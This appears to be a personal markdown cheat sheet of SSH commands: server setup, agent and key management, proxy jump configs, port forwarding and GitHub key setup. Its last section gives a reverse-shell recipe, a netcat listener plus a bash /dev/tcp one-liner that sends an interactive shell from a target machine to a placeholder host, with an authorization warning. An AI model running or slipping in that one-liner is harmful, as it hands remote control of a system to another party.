# SSH

## Enable SSH Server (Debian)

```
sudo apt install openssh-server
sudo systemctl enable ssh
sudo systemctl start ssh
sudo ufw allow ssh
sudo ufw enable
```

## SSH Agent
List ssh-agent keys
`ssh-add -l`

Add SSH Key to the ssh-agent
`ssh-add </path/to/your/private/key>`

Remove Key from the ssh-agent
`ssh-add -d </path/to/your/private/key>`

Start the ssh-agent
`eval "$(ssh-agent -s)"`

Restart the ssh-agent
`eval "$(ssh-agent -k)"  # Kill the agent`
`eval "$(ssh-agent)"     # Start a fresh instance`

## Keys
Generate new key
`ssh-keygen -t rsa -b 4096 -C <email@domain.com>` 

Generate new key using ed25519 (best practice) `ssh-keygen -t ed25519 -C <your_email@example.com>`

Copy key to remote
`ssh-copy-id -i $<key_path> <user>@<hostname/ip>`

Use a specific key during connection
`ssh -o "IdentitiesOnly=yes" -i <key_path> -p <port> <user><hostname/ip>`

Use **only** password authentication (if is is allowed)
`ssh -o PubkeyAuthentication=no user>@<hostname/ip>`

## Proxy Jump
SSH proxy jump
`ssh -J <user-proxy>@<domain/ip-proxy> <user-target>@<domai/ip-target>`

SSh proxy jump on user configuration (~/.ssh/config)
```
Host <proxy-host-name>
  HostName <IP-address>
  User <user-name>                  # Not important
  Port <specify-port-number-here>   # Not important
  IdentityFile ~/.ssh/<file1>       # Not important

### The Remote Host
Host <private-server-name>
  HostName <IP-address>             # Not important
  User <user-name>                  # Not important
  Port <specify-port-number-here>   # Not important
  IdentityFile ~/.ssh/<file2>       # Not important
  ProxyJump <proxy-host-name>
```

## Configuration
Check SSH Configuration
`ssh -G <hostname>`

Global configuration filepath
`/etc/ssh/ssh_config`

## Other connections
Remote Command Execution
`ssh <user>@<hostname/ip> "<command>"`

Local Port Forwarding (Forward a port from the remote machine to your local machine)
`ssh -L <local_port>:<remote_host>:<remote_port> -N <user>@<hostname/ip>` # Use -N if you don’t need a shell session

Remote Port Forwarding: (Forward a port from your local machine to a remote machine)
`ssh -R <remote_port>:<local_host>:<local_port> -N <user>@<hostname/ip>` # Use -N if you don’t need a shell session

Create an SSH SOCKS proxy for dynamic port forwarding
`ssh -D <local_port> <user>@<hostname>`

## Use SSH key on Github

1. Run `ssh-keygen -t ed25519 -C "your_email@example.com"`
2. `cat ~/.ssh/<keyname>.pub` and copy your key
3. Paste it as is on your github account as an authentication key
4. Add on your `~/.ssh/config` this:
```
Host github.com
  HostName github.com
  User git
  IdentityFile ~/.ssh/<keyname>
  IdentitiesOnly yes
  IdentityAgent none
  AddKeysToAgent no
```
5. Evaluate that it is working by running `ssh -T git@github.com`
6. For security run `chmod 400 ~/.ssh/<keyname>`
7. If you have repositories that have been cloned using https, do the following
```
# Inspect remotes
git remote -v

# Update
git remote set-url origin git@github.com:Username/repository-name.git

# Inspect remotes again
```

## Reverse shell 

Listener (the machine that wants to establish the ssh connection)
```bash
nc -lvnp <port>
```

From the target machine run one of the commands based on the use case.

1. Terminal
```bash
/bin/bash -i >& /dev/tcp/<ip/hostname>/<port> 0>&1
```

> [!WARNING]
> Use reverse shell only on systems that you have explicit authorization to access.